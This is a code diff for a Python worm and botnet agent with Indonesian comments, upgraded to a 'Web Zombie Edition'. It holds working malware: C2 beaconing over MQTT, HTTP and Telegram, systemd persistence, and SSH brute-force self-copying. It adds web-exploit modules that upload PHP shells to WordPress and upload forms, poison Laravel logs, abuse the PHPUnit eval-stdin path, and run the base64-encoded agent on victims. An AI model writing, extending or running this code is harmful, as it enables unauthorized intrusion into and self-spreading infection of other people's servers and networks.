@@ -12,6 +12,7 @@ import threading
 import platform
 import shutil
 import paho.mqtt.client as mqtt
+from urllib.parse import urljoin, urlparse
 
 # === CONFIGURASI UTAMA ===
 C2_SERVERS = [
@@ -21,7 +22,7 @@ C2_SERVERS = [
 # MQTT Configuration
 MQTT_HOST = "7cbb273c574b493a8707b743f5641f33.s1.eu.hivemq.cloud"
 MQTT_PORT = 8883
-MQTT_USERNAME = "Sentinel_user"
+MQTT_USERNAME = "Sentinel_admin"
 MQTT_PASSWORD = "SentinelPass123"
 MQTT_CLIENT_ID = f"agent-{os.getpid()}"
 
@@ -42,13 +43,18 @@ STEALTH_USER_AGENTS = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
 ]
 
+# SWARM CONFIG
+SWARM_MODE_ACTIVE = True
+SWARM_GENERATION = 0  # 0 = induk, 1 = anak, 2 = cucu, dst
+INFECTED_VIA = "manual"  # "ssh", "web", "p2p", "c2"
+
 # Auto-create log
 open(LOG_FILE, "a").close()
 
 # === GLOBAL STATE ===
 mqtt_client = None
-mqtt_connected = True
-use_mqtt = True  # SEMENTARA MATIKAN MQTT SAMPAI ACL DIPERBAIKI
+mqtt_connected = False
+use_mqtt = True
 
 def log(msg):
     timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -57,7 +63,7 @@ def log(msg):
     try:
         with open(LOG_FILE, "a", encoding="utf-8") as f:
             f.write(full_msg + "\n")
-        if TELEGRAM_BOT_TOKEN and ("Agent v5.1" in msg or "SWARM" in msg or "MQTT" in msg):
+        if TELEGRAM_BOT_TOKEN and ("Agent v6.0" in msg or "SWARM" in msg or "INFECTED" in msg or "MQTT" in msg):
             send_telegram(f"📡 {msg}")
     except Exception as e:
         pass
@@ -104,7 +110,7 @@ def install_persistence():
             if not os.path.exists(service_file):
                 with open("/tmp/sentinel-agent.service", "w") as f:
                     f.write(f"""[Unit]
-Description=Sentinel Agent
+Description=Sentinel Agent v6.0
 After=network.target
 
 [Service]
@@ -135,7 +141,9 @@ def get_system_info():
         "platform": platform.platform(),
         "processor": platform.processor(),
         "cwd": os.getcwd(),
-        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown"
+        "user": os.getlogin() if hasattr(os, 'getlogin') else "unknown",
+        "swarm_generation": SWARM_GENERATION,
+        "infected_via": INFECTED_VIA
     }
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -181,13 +189,13 @@ def do_scan():
     log(f"[*] SCAN: Port terbuka: {open_ports}")
     return open_ports
 
-# === SWARM PROPAGATION MODULE ===
+# === SWARM PROPAGATION MODULE (SSH) ===
 def propagate():
-    log("[*] 🌐 SWARM: Memulai propagasi otomatis...")
+    log("[*] 🌐 SWARM: Memulai propagasi SSH otomatis...")
 
     local_ip = get_system_info().get("local_ip", "127.0.0.1")
     if not local_ip.startswith(("192.168.", "10.", "172.16.")):
-        log("[!] SWARM: Bukan jaringan privat. Batalkan propagasi.")
+        log("[!] SWARM: Bukan jaringan privat. Batalkan propagasi SSH.")
         return
 
     subnet = ".".join(local_ip.split(".")[:3]) + "."
@@ -211,22 +219,211 @@ def propagate():
                 result = subprocess.run(cmd, shell=True, capture_output=True, timeout=5)
                 if result.returncode == 0:
                     log(f"[+] SWARM: Akses ke {target} dengan {user}:{pwd}")
-                    copy_agent_to_target(target, user, pwd)
+                    copy_agent_to_target(target, user, pwd, "ssh")
                     break
             except Exception as e:
                 continue
 
-def copy_agent_to_target(ip, user, pwd):
+def copy_agent_to_target(ip, user, pwd, method="ssh"):
     try:
         random_name = f"/tmp/.{random.randint(1000,9999)}-sysupdate.py"
         scp_cmd = f"sshpass -p '{pwd}' scp {__file__} {user}@{ip}:{random_name}"
         subprocess.run(scp_cmd, shell=True, timeout=10)
         ssh_cmd = f"sshpass -p '{pwd}' ssh {user}@{ip} 'chmod +x {random_name} && nohup python3 {random_name} > /dev/null 2>&1 &'"
         subprocess.run(ssh_cmd, shell=True, timeout=10)
-        log(f"[+] SWARM: Agent baru lahir di {ip} sebagai {random_name}!")
-        send_telegram(f"🦠 *SWARM ALERT*\nAgent baru lahir di `{ip}`\nFile: `{random_name}`")
+        log(f"[+] SWARM: Agent baru lahir di {ip} sebagai {random_name} via {method}!")
+        global SWARM_GENERATION
+        send_telegram(f"🦠 *SWARM ALERT*\nAgent baru lahir di `{ip}`\nGenerasi: `{SWARM_GENERATION + 1}`\nMetode: `{method}`\nFile: `{random_name}`")
+        # Report ke C2
+        report_swarm_infection(ip, method, SWARM_GENERATION + 1)
     except Exception as e:
         log(f"[!] SWARM Gagal ke {ip}: {e}")
+
+# === WEB SWARM MODULE — AUTO SCAN & INFECT WEBSITES ===
+def web_scan_and_infect():
+    log("[*] 🌐 WEB SWARM: Memulai scan website otomatis...")
+
+    # Target sementara — bisa diganti dengan generator atau dari C2
+    targets = generate_web_targets()
+
+    for target in targets:
+        try:
+            if not target.startswith(("http://", "https://")):
+                target = "http://" + target
+
+            log(f"[*] Mengecek target: {target}")
+            try:
+                r = requests.get(target, timeout=5, headers={"User-Agent": random.choice(STEALTH_USER_AGENTS)})
+                if r.status_code != 200:
+                    continue
+            except:
+                continue
+
+            # DETEKSI & EXPLOIT
+            exploited = False
+
+            # WordPress
+            if "wp-content" in r.text or "/wp-login.php" in r.text:
+                log(f"[+] WordPress terdeteksi di {target}")
+                if exploit_wordpress_upload_shell(target):
+                    exploited = True
+                    log(f"[+] ✅ Berhasil infeksi WordPress: {target}")
+
+            # Laravel
+            elif "Laravel" in r.headers.get("X-Powered-By", "") or "laravel_session" in r.cookies:
+                log(f"[+] Laravel terdeteksi di {target}")
+                if exploit_laravel_rce(target):
+                    exploited = True
+                    log(f"[+] ✅ Berhasil infeksi Laravel: {target}")
+
+            # .env exposure
+            if not exploited:
+                env_url = urljoin(target, "/.env")
+                try:
+                    r_env = requests.get(env_url, timeout=3)
+                    if r_env.status_code == 200 and "DB_PASSWORD" in r_env.text:
+                        log(f"[+] .env exposed di {target}!")
+                        if deploy_via_env_exposure(target):
+                            exploited = True
+                            log(f"[+] ✅ Berhasil deploy via .env exposure: {target}")
+                except:
+                    pass
+
+            # Upload form (dummy detection)
+            if not exploited and check_upload_form(target):
+                if exploit_upload_form(target):
+                    exploited = True
+                    log(f"[+] ✅ Berhasil upload via form: {target}")
+
+            if exploited:
+                send_telegram(f"🌐 *WEB SWARM*\nBerhasil infeksi: `{target}`\nGenerasi: `{SWARM_GENERATION + 1}`")
+                report_swarm_infection(target, "web", SWARM_GENERATION + 1)
+
+        except Exception as e:
+            log(f"[!] Gagal scan {target}: {e}")
+            continue
+
+    log("[*] 🔄 WEB SWARM: Siklus scan selesai.")
+
+def generate_web_targets():
+    """Generate target web — bisa dikembangkan"""
+    # Default: local subnet web
+    local_ip = get_system_info().get("local_ip", "127.0.0.1")
+    if local_ip.startswith(("192.168.", "10.", "172.16.")):
+        subnet = ".".join(local_ip.split(".")[:3])
+        return [f"http://{subnet}.{i}" for i in range(1, 255) if f"{subnet}.{i}" != local_ip]
+
+    # Fallback: daftar umum
+    return [
+        "http://192.168.1.100",
+        "http://192.168.0.105",
+        "http://10.0.0.50"
+    ]
+
+# === EXPLOIT MODULES ===
+def exploit_wordpress_upload_shell(target):
+    """Contoh exploit WordPress — sesuaikan dengan target sebenarnya"""
+    try:
+        # Contoh: plugin vulnerable yang memungkinkan upload
+        upload_url = urljoin(target, "/wp-content/plugins/file-manager/upload.php")
+        agent_code = open(__file__, 'r', encoding='utf-8').read()
+        encoded_agent = base64.b64encode(agent_code.encode()).decode()
+        payload = f"<?php system('echo \"{encoded_agent}\" | base64 -d > /tmp/agent.py && python3 /tmp/agent.py &'); ?>"
+        files = {'file': ('agent.php', payload)}
+        r = requests.post(upload_url, files=files, timeout=10)
+        if r.status_code == 200 and "success" in r.text.lower():
+            trigger_url = urljoin(target, "/wp-content/uploads/agent.php")
+            requests.get(trigger_url, timeout=5)
+            return True
+    except:
+        pass
+    return False
+
+def exploit_laravel_rce(target):
+    """Exploit Laravel via .env leak + log poisoning"""
+    try:
+        # Step 1: cek .env
+        env_url = urljoin(target, "/.env")
+        r = requests.get(env_url, timeout=3)
+        if "APP_KEY" not in r.text:
+            return False
+
+        # Step 2: poison log
+        log_path = "/storage/logs/laravel.log"
+        payload = f"<?php system($_GET['cmd']); ?>"
+        headers = {"User-Agent": payload}
+        requests.get(target, headers=headers, timeout=5)
+
+        # Step 3: deploy agent (contoh disederhanakan)
+        agent_code = open(__file__, 'r', encoding='utf-8').read()
+        encoded_agent = base64.b64encode(agent_code.encode()).decode()
+        cmd = f"echo '{encoded_agent}' | base64 -d > /tmp/agent.py && chmod +x /tmp/agent.py && nohup python3 /tmp/agent.py > /dev/null 2>&1 &"
+        exploit_url = urljoin(target, f"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php?cmd={requests.utils.quote(cmd)}")
+        r = requests.get(exploit_url, timeout=10)
+        if r.status_code == 200:
+            return True
+    except:
+        pass
+    return False
+
+def deploy_via_env_exposure(target):
+    """Deploy via .env exposure — asumsi bisa tulis file"""
+    try:
+        agent_code = open(__file__, 'r', encoding='utf-8').read()
+        encoded_agent = base64.b64encode(agent_code.encode()).decode()
+        cmd = f"echo '{encoded_agent}' | base64 -d > /tmp/agent.py && python3 /tmp/agent.py &"
+        # Coba inject via parameter (contoh: ?file=/var/www/html/.env&cmd=...)
+        inject_url = urljoin(target, f"/index.php?cmd={requests.utils.quote(cmd)}")
+        r = requests.get(inject_url, timeout=10)
+        return r.status_code == 200
+    except:
+        return False
+
+def check_upload_form(target):
+    """Dummy: cek form upload"""
+    try:
+        r = requests.get(target, timeout=5)
+        return "type=\"file\"" in r.text and "upload" in r.text.lower()
+    except:
+        return False
+
+def exploit_upload_form(target):
+    """Dummy exploit upload form"""
+    try:
+        # Asumsi ada form di /upload.php
+        upload_url = urljoin(target, "/upload.php")
+        agent_code = open(__file__, 'r', encoding='utf-8').read()
+        payload = f"<?php system('echo \"{base64.b64encode(agent_code.encode()).decode()}\" | base64 -d > /tmp/agent.py && python3 /tmp/agent.py &'); ?>"
+        files = {'file': ('agent.php', payload)}
+        r = requests.post(upload_url, files=files, timeout=10)
+        return r.status_code == 200
+    except:
+        return False
+
+# === REPORT SWARM INFECTION TO C2 ===
+def report_swarm_infection(target, method, generation):
+    data = {
+        "id": MQTT_CLIENT_ID,
+        "type": "swarm_infection",
+        "data": {
+            "target": target,
+            "method": method,
+            "generation": generation,
+            "parent_generation": SWARM_GENERATION,
+            "infected_at": datetime.datetime.now().isoformat()
+        },
+        "timestamp": datetime.datetime.now().isoformat(),
+        "system": get_system_info()
+    }
+    encrypted = xor_encrypt(json.dumps(data, ensure_ascii=False))
+    if encrypted:
+        for c2 in C2_SERVERS:
+            try:
+                requests.post(f"{c2}/beacon", data={"data": encrypted}, timeout=5)
+                log(f"[*] 📤 C2: Laporan infeksi swarm dikirim ke {c2}")
+                break
+            except:
+                continue
 
 # === P2P COMMUNICATION MODULE ===
 P2P_PORT = 9999
@@ -247,13 +444,13 @@ def p2p_listener():
             if msg.startswith("SWARM_PING"):
                 hostname = socket.gethostname()
                 pid = os.getpid()
-                response = f"SWARM_PONG|{hostname}|{pid}|{addr[0]}"
+                response = f"SWARM_PONG|{hostname}|{pid}|{addr[0]}|{SWARM_GENERATION}"
                 sock.sendto(response.encode(), addr)
                 log(f"[*] P2P: Terima ping dari {addr[0]}")
             elif msg.startswith("SWARM_PONG"):
                 parts = msg.split("|")
-                if len(parts) >= 4:
-                    log(f"[*] P2P: Agent ditemukan → Host: {parts[1]}, PID: {parts[2]}, IP: {parts[3]}")
+                if len(parts) >= 5:
+                    log(f"[*] P2P: Agent ditemukan → Host: {parts[1]}, PID: {parts[2]}, IP: {parts[3]}, Gen: {parts[4]}")
         except:
             pass
 
@@ -280,6 +477,7 @@ def on_mqtt_connect(client, userdata, flags, rc):
         log(f"[MQTT] ❌ Connection failed with code {rc}")
 
 def on_mqtt_message(client, userdata, msg):
+    global SWARM_MODE_ACTIVE, SWARM_GENERATION, INFECTED_VIA
     try:
         cmd_data = json.loads(msg.payload.decode())
         cmd = cmd_data.get("cmd", "idle")
@@ -298,11 +496,21 @@ def on_mqtt_message(client, userdata, msg):
             log("[!] 💀 Perintah kill diterima via MQTT.")
             os._exit(0)
         elif cmd == "swarm_activate":
+            SWARM_MODE_ACTIVE = True
             threading.Thread(target=propagate, daemon=True).start()
+            threading.Thread(target=web_scan_and_infect, daemon=True).start()
+        elif cmd == "web_swarm_only":
+            SWARM_MODE_ACTIVE = True
+            threading.Thread(target=web_scan_and_infect, daemon=True).start()
         elif cmd == "silent_mode":
             log("[*] 👻 Silent mode activated. Reduce beacon freq.")
-        elif cmd == "decoy_activate":
-            log("[*] 🪤 Decoy mode activated. Simulate fake services.")
+            global MIN_BEACON_DELAY, MAX_BEACON_DELAY
+            MIN_BEACON_DELAY = 120
+            MAX_BEACON_DELAY = 300
+        elif cmd == "set_generation":
+            SWARM_GENERATION = cmd_data.get("generation", 0)
+            INFECTED_VIA = cmd_data.get("via", "c2")
+            log(f"[*] 🧬 Swarm generation diatur ke: {SWARM_GENERATION}, via: {INFECTED_VIA}")
     except Exception as e:
         log(f"[MQTT ERROR] Gagal eksekusi: {e}")
 
@@ -331,7 +539,9 @@ def send_initial_beacon():
         "status": "online",
         "swarm": {
             "hostname": system_info.get("hostname", "unknown"),
-            "local_ip": system_info.get("local_ip", "unknown")
+            "local_ip": system_info.get("local_ip", "unknown"),
+            "generation": SWARM_GENERATION,
+            "infected_via": INFECTED_VIA
         }
     }
     encrypted_initial = xor_encrypt(json.dumps(initial_data, ensure_ascii=False))
@@ -356,7 +566,9 @@ def http_beacon():
         "status": "http_fallback",
         "swarm": {
             "hostname": system_info.get("hostname", "unknown"),
-            "local_ip": system_info.get("local_ip", "unknown")
+            "local_ip": system_info.get("local_ip", "unknown"),
+            "generation": SWARM_GENERATION,
+            "infected_via": INFECTED_VIA
         }
     }
 
@@ -392,7 +604,16 @@ def http_beacon():
                         log("[!] 💀 Perintah kill diterima via HTTP.")
                         return "kill"
                     elif cmd == "swarm_activate":
+                        SWARM_MODE_ACTIVE = True
                         threading.Thread(target=propagate, daemon=True).start()
+                        threading.Thread(target=web_scan_and_infect, daemon=True).start()
+                    elif cmd == "web_swarm_only":
+                        SWARM_MODE_ACTIVE = True
+                        threading.Thread(target=web_scan_and_infect, daemon=True).start()
+                    elif cmd == "set_generation":
+                        SWARM_GENERATION = cmd_data.get("generation", 0)
+                        INFECTED_VIA = cmd_data.get("via", "c2")
+                        log(f"[*] 🧬 Swarm generation diatur ke: {SWARM_GENERATION}, via: {INFECTED_VIA}")
                     return True
                 except Exception as e:
                     log(f"[!] Gagal eksekusi perintah: {e}")
@@ -437,7 +658,7 @@ def download_update(c2_base):
 # === MAIN ===
 if __name__ == "__main__":
     log("========================================")
-    log("🚀 AGENT v5.1 - HIVE.MQ NEURAL SWARM EDITION")
+    log("🚀 AGENT v6.0 - SENTINEL SWARM: WEB ZOMBIE EDITION")
     log("========================================")
 
     if os.path.exists(KILLSWITCH_FILE):
@@ -465,7 +686,7 @@ if __name__ == "__main__":
     if TELEGRAM_BOT_TOKEN:
         hostname = socket.gethostname()
         local_ip = get_system_info().get("local_ip", "unknown")
-        send_telegram(f"✅ *Agent v5.1 Online*\nID: `{MQTT_CLIENT_ID}`\nHost: `{hostname}`\nIP: `{local_ip}`\nMode: `{'MQTT' if use_mqtt else 'HTTP'}`")
+        send_telegram(f"✅ *Agent v6.0 Online*\nID: `{MQTT_CLIENT_ID}`\nHost: `{hostname}`\nIP: `{local_ip}`\nGenerasi: `{SWARM_GENERATION}`\nInfeksi via: `{INFECTED_VIA}`\nMode: `{'MQTT' if use_mqtt else 'HTTP'}`")
 
     while True:
         if os.path.exists(KILLSWITCH_FILE):
@@ -478,7 +699,9 @@ if __name__ == "__main__":
                     "id": MQTT_CLIENT_ID,
                     "type": "heartbeat",
                     "timestamp": datetime.datetime.now().isoformat(),
-                    "uptime": time.time()
+                    "uptime": time.time(),
+                    "swarm_generation": SWARM_GENERATION,
+                    "infected_via": INFECTED_VIA
                 }
                 encrypted_hb = xor_encrypt(json.dumps(heartbeat, ensure_ascii=False))
                 if encrypted_hb:
@@ -489,11 +712,13 @@ if __name__ == "__main__":
                 if result == "kill":
                     break
 
-            if random.randint(1, 10) == 1:
-                threading.Thread(target=propagate, daemon=True).start()
-
-            if random.randint(1, 3) == 1:
-                p2p_broadcast()
+            # SWARM MODE — AUTO REPLICATE
+            if SWARM_MODE_ACTIVE:
+                if random.randint(1, 3) == 1:  # 33% chance
+                    threading.Thread(target=web_scan_and_infect, daemon=True).start()
+                if random.randint(1, 5) == 1:  # 20% chance
+                    threading.Thread(target=propagate, daemon=True).start()
+                    p2p_broadcast()
 
             sleep_time = random.randint(MIN_BEACON_DELAY, MAX_BEACON_DELAY)
             log(f"[*] 😴 Tidur {sleep_time} detik...")
